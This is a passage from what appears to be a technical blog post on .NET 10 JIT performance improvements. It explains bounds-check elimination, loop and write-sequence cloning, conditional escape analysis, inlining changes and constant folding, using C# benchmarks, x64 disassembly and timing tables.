[DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _array = [1, 2]; [Benchmark] public int SumArray() =&gt; Sum(_array); [MethodImpl(MethodImplOptions.NoInlining)] public int Sum(ReadOnlySpan<int> span) { switch (span.Length) { case 0: return 0; case 1: return span[0]; case 2: return span[0] + span[1]; case 3: return span[0] + span[1] + span[2]; default: return -1; } } }</int></code></pre><p>On .NET 9, each of those six <code>span</code> dereferences ends up with a bounds check:</p><pre><code>; .NET 9 ; Tests.Sum(System.ReadOnlySpan`1<int32>) push rbp mov rbp,rsp M01_L00: cmp edx,2 jne short M01_L02 test edx,edx je short M01_L04 mov eax,[rsi] cmp edx,1 jbe short M01_L04 add eax,[rsi+4] M01_L01: pop rbp ret M01_L02: cmp edx,3 ja short M01_L03 mov eax,edx lea rcx,[783DA42091B8] mov ecx,[rcx+rax*4] lea rdi,[M01_L00] add rcx,rdi jmp rcx M01_L03: mov eax,0FFFFFFFF pop rbp ret test edx,edx je short M01_L04 mov eax,[rsi] cmp edx,1 jbe short M01_L04 add eax,[rsi+4] cmp edx,2 jbe short M01_L04 add eax,[rsi+8] jmp short M01_L01 test edx,edx je short M01_L04 mov eax,[rsi] jmp short M01_L01 xor eax,eax pop rbp ret M01_L04: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 103</int32></code></pre><p>You can see the tell-tale bounds check sign (<code>CORINFO_HELP_RNGCHKFAIL</code>) under <code>M01_L04</code>, and no fewer than six jumps targeting that label, one for each <code>span[...]</code> access. But on .NET 10, we get this:</p><pre><code>; .NET 10 ; Tests.Sum(System.ReadOnlySpan`1<int32>) push rbp mov rbp,rsp M01_L00: cmp edx,2 jne short M01_L02 mov eax,[rsi] add eax,[rsi+4] M01_L01: pop rbp ret M01_L02: cmp edx,3 ja short M01_L03 mov eax,edx lea rcx,[72C15C0F8FD8] mov ecx,[rcx+rax*4] lea rdx,[M01_L00] add rcx,rdx jmp rcx M01_L03: mov eax,0FFFFFFFF pop rbp ret xor eax,eax pop rbp ret mov eax,[rsi] jmp short M01_L01 mov eax,[rsi] add eax,[rsi+4] add eax,[rsi+8] jmp short M01_L01 ; Total bytes of code 70</int32></code></pre><p>The <code>CORINFO_HELP_RNGCHKFAIL</code> and all the jumps to it have evaporated.</p><h3>Cloning</h3><p>There are other ways the JIT can remove bounds checking even when it can&rsquo;t prove statically that every individual access is safe. Consider this method:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _arr = new int[16]; [Benchmark] public void Test() { int[] arr = _arr; arr[0] = 2; arr[1] = 3; arr[2] = 5; arr[3] = 8; arr[4] = 13; arr[5] = 21; arr[6] = 34; arr[7] = 55; } }</code></pre><p>Here&rsquo;s the assembly code generated on .NET 9:</p><pre><code>; .NET 9 ; Tests.Test() push rax mov rax,[rdi+8] mov ecx,[rax+8] test ecx,ecx je short M00_L00 mov dword ptr [rax+10],2 cmp ecx,1 jbe short M00_L00 mov dword ptr [rax+14],3 cmp ecx,2 jbe short M00_L00 mov dword ptr [rax+18],5 cmp ecx,3 jbe short M00_L00 mov dword ptr [rax+1C],8 cmp ecx,4 jbe short M00_L00 mov dword ptr [rax+20],0D cmp ecx,5 jbe short M00_L00 mov dword ptr [rax+24],15 cmp ecx,6 jbe short M00_L00 mov dword ptr [rax+28],22 cmp ecx,7 jbe short M00_L00 mov dword ptr [rax+2C],37 add rsp,8 ret M00_L00: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 114</code></pre><p>Even if you&rsquo;re not proficient at reading assembly, the pattern should still be obvious. In the C# code, we have eight writes into the array, and in the assembly code, we have eight repetitions of the same pattern: <code>cmp ecx,LENGTH</code> to compare the length of the array against the required <code>LENGTH</code>, <code>jbe short M00_L00</code> to jump to the <code>CORINFO_HELP_RNGCHKFAIL</code> helper if the bounds check fails, and <code>mov dword ptr [rax+OFFSET],VALUE</code> to store <code>VALUE</code> into the array at byte offset <code>OFFSET</code>. Inside the <code>Test</code> method, the JIT can&rsquo;t know how long <code>_arr</code> is, so it must include bounds checks. Moreover, it must include all of the bounds checks, rather than coalescing them, because it is forbidden from introducing behavioral changes as part of optimizations. Imagine instead if it chose to coalesce all of the bounds checks into a single check, and emitted this method as if it were the equivalent of the following:</p><pre><code>if (arr.Length &gt;= 8) { arr[0] = 2; arr[1] = 3; arr[2] = 5; arr[3] = 8; arr[4] = 13; arr[5] = 21; arr[6] = 34; arr[7] = 55; } else { throw new IndexOutOfRangeException(); }</code></pre><p>Now, let&rsquo;s say the array was actually of length four. The original program would have filled the array with values <code>[2, 3, 5, 8]</code> before throwing an exception, but this transformed code wouldn&rsquo;t (there wouldn&rsquo;t be any writes to the array). That&rsquo;s an observable behavioral change. An enterprising developer could of course <em>choose</em> to rewrite their code to avoid some of these checks, e.g.</p><pre><code>arr[7] = 55; arr[0] = 2; arr[1] = 3; arr[2] = 5; arr[3] = 8; arr[4] = 13; arr[5] = 21; arr[6] = 34;</code></pre><p>By moving the last store to the beginning, the developer has given the JIT extra knowledge. The JIT can now see that <em>if</em> the first store succeeds, the rest are guaranteed to succeed as well, and the JIT will emit a single bounds check. But, again, that&rsquo;s the developer choosing to change their program in a way the JIT must not. However, there are other things the JIT <em>can</em> do. Imagine the JIT chose to rewrite the method like this instead:</p><pre><code>if (arr.Length &gt;= 8) { arr[0] = 2; arr[1] = 3; arr[2] = 5; arr[3] = 8; arr[4] = 13; arr[5] = 21; arr[6] = 34; arr[7] = 55; } else { arr[0] = 2; arr[1] = 3; arr[2] = 5; arr[3] = 8; arr[4] = 13; arr[5] = 21; arr[6] = 34; arr[7] = 55; }</code></pre><p>To our C# sensibilities, that looks unnecessarily complicated; the <code>if</code> and the <code>else</code> block contain <em>exactly</em> the same C# code. But, knowing what we now know about how the JIT can use known length information to elide bounds checks, it starts to make a bit more sense. Here&rsquo;s what the JIT emits for this variant on .NET 9:</p><pre><code>; .NET 9 ; Tests.Test() push rbp mov rbp,rsp mov rax,[rdi+8] mov ecx,[rax+8] cmp ecx,8 jl short M00_L00 mov rcx,300000002 mov [rax+10],rcx mov rcx,800000005 mov [rax+18],rcx mov rcx,150000000D mov [rax+20],rcx mov rcx,3700000022 mov [rax+28],rcx pop rbp ret M00_L00: test ecx,ecx je short M00_L01 mov dword ptr [rax+10],2 cmp ecx,1 jbe short M00_L01 mov dword ptr [rax+14],3 cmp ecx,2 jbe short M00_L01 mov dword ptr [rax+18],5 cmp ecx,3 jbe short M00_L01 mov dword ptr [rax+1C],8 cmp ecx,4 jbe short M00_L01 mov dword ptr [rax+20],0D cmp ecx,5 jbe short M00_L01 mov dword ptr [rax+24],15 cmp ecx,6 jbe short M00_L01 mov dword ptr [rax+28],22 cmp ecx,7 jbe short M00_L01 mov dword ptr [rax+2C],37 pop rbp ret M00_L01: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 177</code></pre><p>The <code>else</code> block is compiled to the <code>M00_L00</code> label, which contains those same eight repeated blocks we saw earlier. But the <code>if</code> block (above the <code>M00_L00</code> label) is interesting. The only branch there is the initial <code>array.Length &gt;= 8</code> check I wrote in the C# code, emitted as the <code>cmp ecx,8</code>/<code>jl short M00_L00</code> pair of instructions. The rest of the block is just <code>mov</code> instructions (and you can see there are only four writes into the array rather than eight&hellip; the JIT has optimized the eight four-byte writes into four eight-byte writes). In our rewrite, we&rsquo;ve manually cloned the code, so that in what we expect to be the vast, vast, vast majority case (presumably we wouldn&rsquo;t have written the array writes in the first place if we thought they&rsquo;d fail), we only incur the single length check, and then we have our &ldquo;hopefully this is never needed&rdquo; fallback case for the rare situation where it is. Of course, you shouldn&rsquo;t (and shouldn&rsquo;t need to) do such manual cloning. But, the JIT can do such cloning for you, and does.</p><p>&ldquo;Cloning&rdquo; is an optimization long employed by the JIT, where it will do this kind of code duplication, typically of loops, when it believes that in doing so, it can heavily optimize a common case. Now in .NET 10, thanks to <a href="https://github.com/dotnet/runtime/pull/112595">dotnet/runtime#112595</a>, it can employ this same technique for these kinds of sequences of writes. Going back to our original benchmark, here&rsquo;s what we now get on .NET 10:</p><pre><code>; .NET 10 ; Tests.Test() push rbp mov rbp,rsp mov rax,[rdi+8] mov ecx,[rax+8] mov edx,ecx cmp edx,7 jle short M00_L01 mov rdx,300000002 mov [rax+10],rdx mov rcx,800000005 mov [rax+18],rcx mov rcx,150000000D mov [rax+20],rcx mov rcx,3700000022 mov [rax+28],rcx M00_L00: pop rbp ret M00_L01: test edx,edx je short M00_L02 mov dword ptr [rax+10],2 cmp ecx,1 jbe short M00_L02 mov dword ptr [rax+14],3 cmp ecx,2 jbe short M00_L02 mov dword ptr [rax+18],5 cmp ecx,3 jbe short M00_L02 mov dword ptr [rax+1C],8 cmp ecx,4 jbe short M00_L02 mov dword ptr [rax+20],0D cmp ecx,5 jbe short M00_L02 mov dword ptr [rax+24],15 cmp ecx,6 jbe short M00_L02 mov dword ptr [rax+28],22 cmp ecx,7 jbe short M00_L02 mov dword ptr [rax+2C],37 jmp short M00_L00 M00_L02: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 179</code></pre><p>This structure looks almost identical to what we got when we manually cloned: the JIT has emitted the same code twice, except in one case, there are no bounds checks, and in the other case, there are all the bounds checks, and a single length check determines which path to follow. Pretty neat.</p><p>As noted, the JIT has been doing cloning for years, in particular for loops over arrays. However, more and more code is being written against spans instead of arrays, and unfortunately this valuable optimization didn&rsquo;t apply to spans. Now with <a href="https://github.com/dotnet/runtime/pull/113575">dotnet/runtime#113575</a>, it does! We can see this with a basic looping example:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _arr = new int[16]; private int _count = 8; [Benchmark] public void WithSpan() { Span<int> span = _arr; int count = _count; for (int i = 0; i &lt; count; i++) { span[i] = i; } } [Benchmark] public void WithArray() { int[] arr = _arr; int count = _count; for (int i = 0; i &lt; count; i++) { arr[i] = i; } } }</int></code></pre><p>In both <code>WithArray</code> and <code>WithSpan</code>, we have the same loop, iterating from 0 to a <code>_count</code> with an unknown relationship to the length of <code>_arr</code>, so there has to be some kind of bounds checking emitted. Here&rsquo;s what we get on .NET 9 for <code>WithSpan</code>:</p><pre><code>; .NET 9 ; Tests.WithSpan() push rbp mov rbp,rsp mov rax,[rdi+8] test rax,rax je short M00_L03 lea rcx,[rax+10] mov eax,[rax+8] M00_L00: mov edi,[rdi+10] xor edx,edx test edi,edi jle short M00_L02 nop dword ptr [rax] M00_L01: cmp edx,eax jae short M00_L04 mov [rcx+rdx*4],edx inc edx cmp edx,edi jl short M00_L01 M00_L02: pop rbp ret M00_L03: xor ecx,ecx xor eax,eax jmp short M00_L00 M00_L04: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 59</code></pre><p>There&rsquo;s some upfront assembly here associated with loading <code>_array</code> into a span, loading <code>_count</code>, and checking to see whether the count is 0 (in which case the whole loop can be skipped). Then the core of the loop is at <code>M00_L01</code>, which is repeatedly checking <code>edx</code> (which contains <code>i</code>) against the length of the span (in <code>eax</code>), jumping to <code>CORINFO_HELP_RNGCHKFAIL</code> if it&rsquo;s an out-of-bounds access, writing <code>edx</code> (<code>i</code>) into the span at the next position, bumping up <code>i</code>, and then jumping back to <code>M00_L01</code> to keep iterating if <code>i</code> is still less than <code>count</code> (stored in <code>edi</code>). In other words, we have two checks per iteration: is <code>i</code> still within the bounds of the span, and is <code>i</code> still less than <code>count</code>. Now here&rsquo;s what we get on .NET 9 for <code>WithArray</code>:</p><pre><code>; .NET 9 ; Tests.WithArray() push rbp mov rbp,rsp mov rax,[rdi+8] mov ecx,[rdi+10] xor edx,edx test ecx,ecx jle short M00_L01 test rax,rax je short M00_L02 cmp [rax+8],ecx jl short M00_L02 nop dword ptr [rax+rax] M00_L00: mov edi,edx mov [rax+rdi*4+10],edx inc edx cmp edx,ecx jl short M00_L00 M00_L01: pop rbp ret M00_L02: cmp edx,[rax+8] jae short M00_L03 mov edi,edx mov [rax+rdi*4+10],edx inc edx cmp edx,ecx jl short M00_L02 jmp short M00_L01 M00_L03: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 71</code></pre><p>Here, label <code>M00_L02</code> looks very similar to the loop we just saw in <code>WithSpan</code>, incurring both the check against <code>count</code> and the bounds check on every iteration. But note section <code>M00_L00</code>: it&rsquo;s a clone of the same loop, still with the <code>cmp edx,ecx</code> that checks <code>i</code> against <code>count</code> on each iteration, but no additional bounds checking in sight. The JIT has cloned the loop, specializing one to not have bounds checks, and then in the upfront section, it determines which path to follow based on a single check against the array&rsquo;s length (<code>cmp [rax+8],ecx</code>/<code>jl short M00_L02</code>). Now in .NET 10, here&rsquo;s what we get for <code>WithSpan</code>:</p><pre><code>; .NET 10 ; Tests.WithSpan() push rbp mov rbp,rsp mov rax,[rdi+8] test rax,rax je short M00_L04 lea rcx,[rax+10] mov eax,[rax+8] M00_L00: mov edx,[rdi+10] xor edi,edi test edx,edx jle short M00_L02 cmp edx,eax jg short M00_L03 M00_L01: mov eax,edi mov [rcx+rax*4],edi inc edi cmp edi,edx jl short M00_L01 M00_L02: pop rbp ret M00_L03: cmp edi,eax jae short M00_L05 mov esi,edi mov [rcx+rsi*4],edi inc edi cmp edi,edx jl short M00_L03 jmp short M00_L02 M00_L04: xor ecx,ecx xor eax,eax jmp short M00_L00 M00_L05: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 75</code></pre><p>As with <code>WithArray</code> in .NET 9, <code>WithSpan</code> for .NET 10 has the loop cloned, with the <code>M00_L03</code> block containing the bounds check on each iteration, and the <code>M00_L01</code> block eliding the bounds check on each iteration.</p><p>The JIT gains more cloning abilities in .NET 10, as well. <a href="https://github.com/dotnet/runtime/pull/110020">dotnet/runtime#110020</a>, <a href="https://github.com/dotnet/runtime/pull/108604">dotnet/runtime#108604</a>, and <a href="https://github.com/dotnet/runtime/pull/110483">dotnet/runtime#110483</a> make it possible for the JIT to clone <code>try/finally</code> blocks, whereas previously it would immediately bail out of cloning any regions containing such constructs. This might seem niche, but it&rsquo;s actually quite valuable when you consider that <code>foreach</code>&lsquo;ing over an enumerable typically involves a hidden <code>try</code>/<code>finally</code> for the <code>finally</code> to call the enumerator&rsquo;s <code>Dispose</code>.</p><p>Many of these different optimizations interact with each other. Dynamic PGO triggers a form of cloning, as part of the guarded devirtualization (GDV) mentioned earlier: if the instrumentation data reveals that a particular virtual call is generally performed on an instance of a specific type, the JIT can clone the resulting code into one path specific to that type and another path that handles any type. That then enables the specific-type code path to devirtualize the call and possibly inline it. And if it inlines it, that then provides more opportunities for the JIT to see that an object doesn&rsquo;t escape, and potentially stack allocate it. <a href="https://github.com/dotnet/runtime/pull/111473">dotnet/runtime#111473</a>, <a href="https://github.com/dotnet/runtime/pull/116978">dotnet/runtime#116978</a>, <a href="https://github.com/dotnet/runtime/pull/116992">dotnet/runtime#116992</a>, <a href="https://github.com/dotnet/runtime/pull/117222">dotnet/runtime#117222</a>, and <a href="https://github.com/dotnet/runtime/pull/117295">dotnet/runtime#117295</a> enable that, enhancing escape analysis to determine if an object only escapes when such a generated type test fails (when the target object isn&rsquo;t of the expected common type).</p><p>I want to pause for a moment, because my words thus far aren&rsquo;t nearly enthusiastic enough to highlight the magnitude of what this enables. The <code>dotnet/runtime</code> repo uses an automated performance analysis system which flags when benchmarks significantly improve or regress and ties those changes back to the responsible PR. This is what it looked like for this PR: <img src="https://devblogs.microsoft.com/dotnet/wp-content/uploads/sites/10/2025/09/ConditionalEscapeAnalysisImprovements.png" alt="Conditional Escape Analysis Triggering Many Benchmark Improvements"> We can see why this is so good from a simple example:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _values = Enumerable.Range(1, 100).ToArray(); [Benchmark] public int Sum() =&gt; Sum(_values); [MethodImpl(MethodImplOptions.NoInlining)] private static int Sum(IEnumerable<int> values) { int sum = 0; foreach (int value in values) { sum += value; } return sum; } }</int></code></pre><p>With dynamic PGO, the instrumented code for <code>Sum</code> will see that <code>values</code> is generally an <code>int[]</code>, and it&rsquo;ll be able to emit a specialized code path in the optimized <code>Sum</code> implementation for when it is. And then with this ability to do conditional escape analysis, for the common path the JIT can see that the resulting <code>GetEnumerator</code> produces an <code>IEnumerator<int></int></code> that never escapes, such that along with all of the relevant methods being devirtualized and inlined, the enumerator can be stack allocated.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>.NET 9.0</td> <td>109.86 ns</td> <td>1.00</td> <td>32 B</td> <td>1.00</td> </tr> <tr> <td>Sum</td> <td>.NET 10.0</td> <td>35.45 ns</td> <td>0.32</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>Just think about how many places in your apps and services you enumerate collections like this, and you can see why it&rsquo;s such an exciting improvement. Note that these cases don&rsquo;t always even require PGO. Consider a case like this:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private static readonly IEnumerable<int> s_values = new int[] { 1, 2, 3, 4, 5 }; [Benchmark] public int Sum() { int sum = 0; foreach (int value in s_values) { sum += value; } return sum; } }</int></code></pre><p>Here, the JIT can see that even though the <code>s_values</code> is typed as <code>IEnumerable<int></int></code>, it&rsquo;s always actually an <code>int[]</code>. In that case, <a href="https://github.com/dotnet/runtime/pull/111948">dotnet/runtime#111948</a> enables the return type to be retyped in the JIT as <code>int[]</code> and the enumerator can be stack allocated.</p><table> <thead> <tr> <th>Method</th> <th>Runtime</th> <th>Mean</th> <th>Ratio</th> <th>Allocated</th> <th>Alloc Ratio</th> </tr> </thead> <tbody> <tr> <td>Sum</td> <td>.NET 9.0</td> <td>16.341 ns</td> <td>1.00</td> <td>32 B</td> <td>1.00</td> </tr> <tr> <td>Sum</td> <td>.NET 10.0</td> <td>2.059 ns</td> <td>0.13</td> <td>&ndash;</td> <td>0.00</td> </tr> </tbody> </table><p>Of course, too much cloning can be a bad thing, in particular as it increases code size. <a href="https://github.com/dotnet/runtime/pull/108771">dotnet/runtime#108771</a> employs a heuristic to determine whether loops that <em>can</em> be cloned <em>should</em> be cloned; the larger the loop, the less likely it&rsquo;ll be to be cloned.</p><h3>Inlining</h3><p>&ldquo;Inlining&rdquo;, which replaces a call to a function with a copy of that function&rsquo;s implementation, has always been a critically important optimization. It&rsquo;s easy to think about the benefits of inlining as just being about avoiding the overhead of a call, and while that can be meaningful (especially when considering security mechanisms like Intel&rsquo;s Control-Flow Enforcement Technology, which slightly increases the cost of calls), generally the most benefit from inlining comes from knock-on benefits. Just as a simple example, if you have code like:</p><pre><code>int i = Divide(10, 5); static int Divide(int n, int d) =&gt; n / d;</code></pre><p>if <code>Divide</code> doesn&rsquo;t get inlined, then when <code>Divide</code> is called, it&rsquo;ll need to perform the actual <code>idiv</code>, which is a relatively expensive operation. In contrast, if <code>Divide</code> is inlined, then the call site becomes:</p><pre><code>int i = 10 / 5;</code></pre><p>which can be evaluated at compile time and becomes just:</p><pre><code>int i = 2;</code></pre><p>More compelling examples were already seen throughout the discussion of escape analysis and stack allocation, which depend heavily on the ability to inline methods. Given the increased importance of inlining, it&rsquo;s gotten even more focus in .NET 10.</p><p>Some of the .NET work related to inlining is about enabling more kinds of things to be inlined. Historically, a variety of constructs present in a method would prevent that method from even being considered for inlining. Arguably the most well known of these is exception handling: methods with exception handling clauses, e.g. <code>try/catch</code> or <code>try/finally</code>, would not be inlined. Even a simple method like <code>M</code> in this example:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private readonly object _o = new(); [Benchmark] public int Test() { M(_o); return 42; } private static void M(object o) { Monitor.Enter(o); try { } finally { Monitor.Exit(o); } } }</code></pre><p>does not get inlined on .NET 9:</p><pre><code>; .NET 9 ; Tests.Test() push rax mov rdi,[rdi+8] call qword ptr [78F199864EE8]; Tests.M(System.Object) mov eax,2A add rsp,8 ret ; Total bytes of code 21</code></pre><p>But with a plethora of PRs, in particular <a href="https://github.com/dotnet/runtime/pull/112968">dotnet/runtime#112968</a>, <a href="https://github.com/dotnet/runtime/pull/113023">dotnet/runtime#113023</a>, <a href="https://github.com/dotnet/runtime/pull/113497">dotnet/runtime#113497</a>, and <a href="https://github.com/dotnet/runtime/pull/112998">dotnet/runtime#112998</a>, methods containing <code>try/finally</code> are no longer blocked from inlining (<code>try/catch</code> regions are still a challenge). For the same benchmark on .NET 10, we now get this assembly:</p><pre><code>; .NET 10 ; Tests.Test() push rbp push rbx push rax lea rbp,[rsp+10] mov rbx,[rdi+8] test rbx,rbx je short M00_L03 mov rdi,rbx call 00007920A0EE65E0 test eax,eax je short M00_L02 M00_L00: mov rdi,rbx call 00007920A0EE6D50 test eax,eax jne short M00_L04 M00_L01: mov eax,2A add rsp,8 pop rbx pop rbp ret M00_L02: mov rdi,rbx call qword ptr [79202393C1F8] jmp short M00_L00 M00_L03: xor edi,edi call qword ptr [79202393C1C8] int 3 M00_L04: mov edi,eax mov rsi,rbx call qword ptr [79202393C1E0] jmp short M00_L01 ; Total bytes of code 86</code></pre><p>The details of the assembly don&rsquo;t matter, other than it&rsquo;s a whole lot more than was there before, because we&rsquo;re now looking in large part at the implementation of <code>M</code>. In addition to methods with <code>try/finally</code> now being inlineable, other improvements have also been made around exception handling. For example, <a href="https://github.com/dotnet/runtime/pull/110273">dotnet/runtime#110273</a> and <a href="https://github.com/dotnet/runtime/pull/110464">dotnet/runtime#110464</a> enable the removal of <code>try/catch</code> and <code>try/fault</code> blocks if it can prove the <code>try</code> block can&rsquo;t possibly throw. Consider this:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "i")] public partial class Tests { [Benchmark] [Arguments(42)] public int Test(int i) { try { i++; } catch { Console.WriteLine("Exception caught"); } return i; } }</code></pre><p>There&rsquo;s nothing the <code>try</code> block here can do that will result in an exception being thrown (assuming the developer hasn&rsquo;t enabled checked arithmetic, in which case it could possibly throw an <code>OverflowException</code>), yet on .NET 9 we get this assembly:</p><pre><code>; .NET 9 ; Tests.Test(Int32) push rbp sub rsp,10 lea rbp,[rsp+10] mov [rbp-10],rsp mov [rbp-4],esi mov eax,[rbp-4] inc eax mov [rbp-4],eax M00_L00: mov eax,[rbp-4] add rsp,10 pop rbp ret push rbp sub rsp,10 mov rbp,[rdi] mov [rsp],rbp lea rbp,[rbp+10] mov rdi,784B08950018 call qword ptr [784B0DE44EE8] lea rax,[M00_L00] add rsp,10 pop rbp ret ; Total bytes of code 79</code></pre><p>Now on .NET 10, the JIT is able to elide the <code>catch</code> and remove all ceremony related to the <code>try</code> because it can see that ceremony is pointless overhead.</p><pre><code>; .NET 10 ; Tests.Test(Int32) lea eax,[rsi+1] ret ; Total bytes of code 4</code></pre><p>That&rsquo;s true even when the contents of the <code>try</code> calls into other methods that are then inlined, exposing their contents to the JIT&rsquo;s analysis.</p><p>(As an aside, the JIT was already able to remove <code>try/finally</code> when the <code>finally</code> was empty, but <a href="https://github.com/dotnet/runtime/pull/108003">dotnet/runtime#108003</a> catches even more cases of checking for empty <code>finally</code>s again after most other optimizations have been run, in case they revealed additional empty blocks.)</p><p>Another example is &ldquo;GVM&rdquo;. Previously, any method that called a GVM, or generic virtual method (a virtual method with a generic type parameter), would be blocked from being inlined.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [MemoryDiagnoser(displayGenColumns: false)] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private Base _base = new(); [Benchmark] public int Test() { M(); return 42; } private void M() =&gt; _base.M<object>(); } class Base { public virtual void M<t>() { } }</t></object></code></pre><p>On .NET 9, the above results in this assembly:</p><pre><code>; .NET 9 ; Tests.Test() push rax call qword ptr [728ED5664FD8]; Tests.M() mov eax,2A add rsp,8 ret ; Total bytes of code 17</code></pre><p>Now on .NET 10, with <a href="https://github.com/dotnet/runtime/pull/116773">dotnet/runtime#116773</a>, <code>M</code> can now be inlined.</p><pre><code>; .NET 10 ; Tests.Test() push rbp push rbx push rax lea rbp,[rsp+10] mov rbx,[rdi+8] mov rdi,rbx mov rsi,offset MT_Base mov rdx,78034C95D2A0 call System.Runtime.CompilerServices.VirtualDispatchHelpers.VirtualFunctionPointer(System.Object, IntPtr, IntPtr) mov rdi,rbx call rax mov eax,2A add rsp,8 pop rbx pop rbp ret ; Total bytes of code 57</code></pre><p>Another area of investment with inlining is to do with the heuristics around when methods should be inlined. Just inlining everything would be bad; inlining copies code, which results in more code, which can have significant negative repercussions. For example, inlining&rsquo;s increased code size puts more pressure on caches. Processors have an instruction cache, a small amount of super fast memory in a CPU that stores recently used instructions, making them really fast to access again the next time they&rsquo;re needed (such as the next iteration through a loop, or the next time that same function is called). Consider a method <code>M</code>, and 100 call sites to <code>M</code> that are all being accessed. If all of those share the same instructions for <code>M</code>, because the 100 call sites are all actually calling <code>M</code>, the instruction cache will only need to load <code>M</code>&lsquo;s instructions once. If all of those 100 call sites each have their own copy of <code>M</code>&lsquo;s instructions, then all 100 copies will separately be loaded through the cache, fighting with each other and other instructions for residence. The less likely it is that instructions are in the cache, the more likely it is that the CPU will stall waiting for the instructions to be loaded from memory.</p><p>For this reason, the JIT needs to be careful what it inlines. It tries hard to avoid inlining anything that won&rsquo;t benefit (e.g. a larger method whose instructions won&rsquo;t be materially influenced by the caller&rsquo;s context) while also trying hard to inline anything that will materially benefit (e.g. small functions where the code required to call the function is similar in size to the contents of the function, functions with instructions that could be materially impacted by information from the call site, etc.) As part of these heuristics, the JIT has the notion of &ldquo;boosts,&rdquo; where observations it makes about things methods do boost the chances of that method being inlined. <a href="https://github.com/dotnet/runtime/pull/114806">dotnet/runtime#114806</a> gives a boost to methods that appear to be returning new arrays of a small, fixed length; if those arrays can instead be allocated in the caller&rsquo;s frame, the JIT might then be able to discover they don&rsquo;t escape and enable them to be stack allocated. <a href="https://github.com/dotnet/runtime/pull/110596">dotnet/runtime#110596</a> similarly looks for boxing, as the caller could possibly instead avoid the box entirely.</p><p>For the same purpose (and also just to minimize time spent performing compilation), the JIT also maintains a budget for how much it allows to be inlined into a method compilation&hellip; once it hits that budget, it might stop inlining anything. The budgeting scheme overall works <em>ok</em>, however in certain circumstances it can run out of budget at very inopportune times, for example doing a lot of inlining at top-level call sites but then running out of budget by the time it gets to small methods that are critically-important to inline for good performance. To help mitigate these scenarios, <a href="https://github.com/dotnet/runtime/pull/114191">dotnet/runtime#114191</a> and <a href="https://github.com/dotnet/runtime/pull/118641">dotnet/runtime#118641</a> more than double the JIT&rsquo;s default inlining budget.</p><p>The JIT also pays a lot of attention to the number of local variables (e.g. parameters/locals explicitly in the IL, JIT-created temporary locals, promoted struct fields, etc.) it tracks. To avoid creating too many, the JIT would stop inlining once it was already tracking 512. But as other changes have made inlining more aggressive, this (strangely hardcoded) limit gets hit more often, leaving very valuable inlinees out in the cold. <a href="https://github.com/dotnet/runtime/pull/118515">dotnet/runtime#118515</a> removed this fixed limit and instead ties it to a large percentage of the number of locals the JIT is allowed to track (by default, this ends up almost doubling the limit used by the inliner).</p><h3>Constant Folding</h3><p>Constant folding is a compiler&rsquo;s ability to perform operations, typically math, at compile-time rather than at run-time: given multiple constants and an expressed relationship between them, the compiler can &ldquo;fold&rdquo; those constants together into a new constant. So, if you have the C# code <code>int M(int i) =&gt; i + 2 * 3;</code>, the C# compiler does constant folding and emits that into your compilation as if you&rsquo;d written <code>int M(int i) =&gt; i + 6;</code>. The JIT can and does also do constant folding, which is valuable especially when it&rsquo;s based on information not available to the C# compiler. For example, the JIT can treat <code>static readonly</code> fields or <code>IntPtr.Size</code> or <code>Vector128<t>.Count</t></code> as constants. And the JIT can do folding across inlines. For example, if you have:</p><pre><code>int M1(int i) =&gt; i + M2(2 * 3); int M2(int j) =&gt; j * 